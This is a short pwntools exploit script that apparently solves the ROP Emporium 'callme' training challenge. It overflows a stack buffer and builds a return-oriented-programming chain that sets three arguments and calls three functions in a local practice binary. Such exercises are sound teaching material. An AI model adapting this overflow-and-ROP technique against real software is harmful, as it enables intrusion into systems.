from pwn import *

#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret

SET_PARAMS=0x00401ab0

CALLME_ONE=0x00401850
CALLME_TWO=0x00401870
CALLME_THREE=0x00401810

exploit=b'A'*40
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1)
exploit+=p64(0x2)
exploit+=p64(0x3)
exploit+=p64(CALLME_ONE)
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1)
exploit+=p64(0x2)
exploit+=p64(0x3)
exploit+=p64(CALLME_TWO)
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1)
exploit+=p64(0x2)
exploit+=p64(0x3)
exploit+=p64(CALLME_THREE)

r=process('./callme')

r.sendline(exploit)
r.interactive()

